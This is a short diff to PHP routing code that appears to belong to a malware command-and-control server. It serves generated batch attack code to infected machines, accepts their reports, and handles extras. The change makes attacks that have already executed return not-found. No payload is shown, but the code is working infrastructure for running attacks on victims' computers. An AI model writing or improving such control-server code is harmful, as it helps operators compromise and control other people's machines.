@@ -1,4 +1,4 @@
-<?php /** @noinspection PhpIncludeInspection */
+<?php
 
 use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\BaseScriptWin;
@@ -22,7 +22,7 @@ $router->getMulti(["vrs/*/aks/*/code", "viruses/*/attacks/*/code"], function () 
     $attack_id = $requestData->getExplodedPath()[3];
     if (!$attackFactory->exists($attack_id)) Logs::strayAttack($attack_id);
     $attack = $attackFactory->get($attack_id);
-    echo($attack->getStatus() == AttackBase::STATUS_EXECUTED ? "" : $attack->generateBatchCode());
+    $attack->getStatus() == AttackBase::STATUS_EXECUTED ? Header::notFound() : $attack->generateBatchCode();
     Header::ok();
 });
 $router->postMulti(["vrs/*/aks/*/report", "viruses/*/attacks/*/report"], function () use ($requestData, $virusFactory, $attackFactory) {
@@ -36,7 +36,7 @@ $router->getMulti(["vrs/*/aks/*/extras/*", "viruses/*/attacks/*/extras/*"], func
     $attack_id = $requestData->getExplodedPath()[3];
     if (!$attackFactory->exists($attack_id)) Logs::strayAttack($attack_id);
     $attack = $attackFactory->get($attack_id);
-    $attack->processExtras($requestData->getExplodedPath()[5]);
+    $attack->getStatus() !== AttackBase::STATUS_EXECUTED ? $attack->processExtras($requestData->getExplodedPath()[5]) : Header::notFound();
     Header::ok();
 });
 
